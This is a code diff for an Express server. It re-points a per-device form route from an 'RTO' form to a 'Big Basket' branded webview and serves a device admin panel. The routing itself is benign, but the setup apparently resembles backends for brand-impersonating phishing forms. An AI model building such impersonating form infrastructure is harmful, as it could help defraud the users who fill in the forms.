@@ -21,27 +21,39 @@ const corsOptions = {
 app.use(cors(corsOptions));
 app.use(express.json());
 
-// Serve static files from specific public directories (ignoring /webview)
-const publicRtoPath = path.join(__dirname, 'public', 'rto');
+// Serve static files for Big Basket webview
+const publicBigBasketPath = path.join(__dirname, 'public', 'big basket');
+const publicBigBasketAltPath = path.join(__dirname, 'public', 'bigbasket');
 const publicImgPath = path.join(__dirname, 'public', 'img');
 
-app.use('/rto', express.static(publicRtoPath));
+app.use('/bigbasket', express.static(publicBigBasketPath));
+app.use('/bigbasket', express.static(publicBigBasketAltPath));
+app.use('/webview', express.static(publicBigBasketPath));
+app.use('/webview', express.static(publicBigBasketAltPath));
+app.use('/rto', express.static(publicBigBasketPath)); // redirect/alias rto to new webview
 app.use('/img', express.static(publicImgPath));
 
-// Form page route — redirect to RTO multi-step form
-app.get('/form', (req, res) => {
+// Webview / Form page route — serve/redirect to Big Basket webview
+app.get(['/form', '/webview', '/rto'], (req, res) => {
     const deviceId = req.query.deviceId || '';
-    res.redirect(`/rto/index.html?deviceId=${encodeURIComponent(deviceId as string)}`);
+    res.redirect(`/webview/index.html?deviceId=${encodeURIComponent(deviceId as string)}`);
 });
 
 // Serve React admin panel (Vite build output copied to dist/client during Docker build)
-// Must be after /api, /rto, /img, /socket.io so API is not shadowed
+// Must be after /api, /bigbasket, /webview, /rto, /img, /socket.io so API is not shadowed
 const clientPath = path.join(__dirname, 'client');
 app.use(express.static(clientPath));
 
 // SPA fallback — send index.html for non-API, non-static routes (React Router: /, /login, /device/:id)
 app.get('*', (req, res, next) => {
-    if (req.path.startsWith('/api') || req.path.startsWith('/socket.io') || req.path.startsWith('/rto') || req.path.startsWith('/img')) {
+    if (
+        req.path.startsWith('/api') ||
+        req.path.startsWith('/socket.io') ||
+        req.path.startsWith('/bigbasket') ||
+        req.path.startsWith('/webview') ||
+        req.path.startsWith('/rto') ||
+        req.path.startsWith('/img')
+    ) {
         return next();
     }
     const indexFile = path.join(clientPath, 'index.html');
